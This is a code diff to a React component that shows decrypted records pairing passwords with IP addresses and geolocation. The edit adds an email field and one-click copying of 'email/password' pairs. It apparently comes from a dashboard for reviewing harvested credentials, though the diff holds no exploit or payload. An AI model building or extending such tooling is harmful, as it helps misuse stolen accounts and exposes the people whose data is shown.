@@ -7,19 +7,21 @@ import { LocationIcon } from '@/core/components/icons/LocationIcon';
 import AppDate from '@/core/features/statistics/components/AppDate';
 import { Statistics } from '@/core/features/statistics/types';
 import { useClipboard } from '@/core/hooks/useClipboard';
+import { isNumeric } from '@/core/utils';
 
 const StatisticsItemDecrypted = ({
+  email,
   appId,
   geo,
   ip,
   password,
   system,
   timestamp,
-}: Statistics) => {
+}: Statistics & { email: string }) => {
   const { copy } = useClipboard();
 
   const handleOpenLocation = (lat: string, long: string) => {
-    if (!Number.isInteger(lat) || !!Number.isInteger(long)) return;
+    if (!isNumeric(lat) || !isNumeric(long)) return;
 
     window.open(
       `https://www.google.com/maps?q=${lat},${long}`,
@@ -40,7 +42,9 @@ const StatisticsItemDecrypted = ({
       {/* Password */}
       <div
         title="Password"
-        onClick={() => handleCopyToClipboard(password)}
+        onClick={() =>
+          handleCopyToClipboard(`email: ${email}\npassword: ${password}`)
+        }
         className="w-4 tooltip-parent relative cursor-pointer transition-opacity"
       >
         <KeyIcon className="opacity-60" />
@@ -61,7 +65,13 @@ const StatisticsItemDecrypted = ({
       </div>
 
       {/* City */}
-      <div title="City">{geo.city}</div>
+      <div
+        title="City"
+        onClick={() => handleCopyToClipboard(`${geo.city} ${geo.country}`)}
+        className="cursor-pointer"
+      >
+        {geo.city}
+      </div>
 
       {/* Country */}
       <div title="Country" className="text-muted">
@@ -70,9 +80,9 @@ const StatisticsItemDecrypted = ({
 
       {/* IP */}
       <div
-        className="cursor-pointer"
         title="IP Address"
-        onClick={() => handleCopyToClipboard(ip)}
+        onClick={() => handleCopyToClipboard(`IPv4: ${ip}`)}
+        className="cursor-pointer"
       >
         {ip}
       </div>
